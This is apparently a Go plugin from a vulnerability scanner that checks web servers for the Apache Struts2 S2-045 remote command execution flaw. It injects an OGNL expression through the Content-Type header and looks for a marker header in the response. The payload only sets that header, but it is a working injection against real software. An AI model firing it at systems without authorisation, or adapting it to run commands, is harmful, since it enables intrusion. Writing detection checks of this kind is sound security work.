package Plugin

import (
	"github.com/valyala/fasthttp"
	"time"
	"strings"
	"net/url"
	"fmt"
)

type S2_045 struct {
	name string
}

func (S2_045) GenPayload(url url.URL) string {
	return url.String()
}

func (plugin S2_045) DoRequest(address string) *fasthttp.Response {
	req := fasthttp.AcquireRequest()
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
	req.Header.Add("infomation", "Just for pentest|By Struts2-045-checker.go")
	req.Header.Add("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('commonscan_org','vul')}.multipart/form-data")
	req.SetRequestURI(address)
	resp := fasthttp.AcquireResponse()
	client := &fasthttp.Client{ReadTimeout: 10 * time.Second, MaxResponseBodySize: 1024 * 1024}
	client.Do(req, resp)
	return resp
}

func (plugin S2_045) ParserResponse(response *fasthttp.Response) bool {
	//fmt.Println(response.Header.String())
	if (strings.Contains(strings.ToLower(string(response.Header.Header())), "commonscan_org")) {
		return true
	}
	return false
}

func (S2_045) GetName() string {
	return "S2_045远程命令执行"
}
func (S2_045) GenInfo(url url.URL) string {
	return fmt.Sprintf("S2_045远程命令执行: %s", url.String())
}
